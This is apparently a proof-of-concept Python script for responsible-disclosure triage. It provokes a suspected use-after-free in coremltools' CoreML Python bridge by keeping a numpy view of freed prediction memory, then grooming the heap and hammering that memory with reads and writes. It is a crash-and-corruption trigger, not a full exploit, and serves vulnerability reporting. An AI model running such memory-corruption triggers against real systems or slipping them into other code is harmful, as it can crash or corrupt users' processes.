#!/usr/bin/env python3
"""
Benign PoC for suspected UAF in coremltools CoreML Python bridge.

Targeted code path:
- coremlpython/CoreMLPythonUtils.mm :: convertArrayValueToPython

Why this PoC exists:
- The bridge builds a numpy array from a pointer obtained via
  MLMultiArray::getBytesWithHandler(...), but does not tie numpy lifetime to
  MLMultiArray lifetime.
- After predict() returns and Objective-C autorelease scopes unwind, the
  MLMultiArray backing storage can be released while Python still holds a
  numpy view.
- Subsequent read/write on that numpy array can become use-after-free.

This script is designed for responsible disclosure triage and produces either:
- deterministic crash under malloc hardening settings, or
- observable corruption/instability in default allocator mode.

Requires:
- macOS 13+ (MLModelAsset.from_memory path)
- coremltools runtime capable of predict() on this platform
"""

from __future__ import annotations

import gc
import os
import platform
import sys
from typing import Dict, Any

import numpy as np
import coremltools as ct
from coremltools.converters.mil import Builder as mb


def _build_in_memory_asset() -> "ct.models.model.MLModelAsset":
    """Build a tiny valid model and return an MLModelAsset from protobuf bytes."""

    @mb.program(input_specs=[mb.TensorSpec(shape=(1024,))])
    def prog(x):
        # Keep output as multiarray to exercise convertArrayValueToPython.
        return mb.square(x=x)

    model = ct.convert(prog, source="milinternal", convert_to="mlprogram")
    spec_data = model.get_spec().SerializeToString()
    return ct.models.model.MLModelAsset.from_memory(spec_data=spec_data)


def _make_dangling_numpy_view() -> np.ndarray:
    """
    Trigger predict() in a localized scope and return only numpy output.

    The function intentionally drops all strong references to CoreML objects
    before returning the output ndarray to maximize stale-pointer conditions.
    """
    asset = _build_in_memory_asset()
    compiled = ct.models.CompiledMLModel.from_asset(asset=asset)

    # Create non-trivial buffer so allocator reuse is easier to observe.
    inp = {"x": np.linspace(1.0, 32.0, 1024, dtype=np.float32)}
    out: Dict[str, Any] = compiled.predict(inp)
    arr = next(iter(out.values()))

    if not isinstance(arr, np.ndarray):
        raise RuntimeError(f"Expected numpy.ndarray output, got: {type(arr)!r}")

    # At this point arr may alias CoreML memory whose lifetime is not owned
    # by numpy. We intentionally return only arr.
    return arr


def _heap_pressure() -> None:
    """Repopulate freed allocator buckets to increase UAF manifestation rate."""
    junk = []
    for _ in range(256):
        junk.append(np.empty((1024, 1024), dtype=np.float32))
    junk.clear()


def main() -> int:
    if platform.system() != "Darwin":
        print("[-] This PoC must run on macOS.")
        return 1

    print("[*] Python:", sys.version.split()[0])
    print("[*] NumPy:", np.__version__)
    print("[*] coremltools:", ct.__version__)
    print("[*] macOS:", platform.mac_ver()[0])

    # Step 1: get ndarray from a local scope only.
    arr = _make_dangling_numpy_view()
    print("[*] Got output ndarray:", arr.shape, arr.dtype)
    print("[*] ndarray data pointer: 0x%x" % arr.__array_interface__["data"][0])

    # Step 2: force Python-level collection and reclaim pressure.
    gc.collect()
    _heap_pressure()
    gc.collect()

    # Step 3: attempt reads/writes through potentially dangling pointer.
    # Under malloc hardening, this should often produce EXC_BAD_ACCESS.
    print("[*] Beginning read/write stress on possibly freed backing memory...")
    checksum = 0.0
    for i in range(2_000_000):
        idx = i & (arr.size - 1)
        checksum += float(arr[idx])
        arr[idx] = arr[idx] + np.float32(1.0)
        if (i % 200_000) == 0:
            _heap_pressure()

    # Reaching this line means no immediate crash in this run.
    print("[!] No crash observed in this run; checksum:", checksum)
    print("[!] Re-run with MallocGuardEdges/MallocScribble (see notes in report).")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
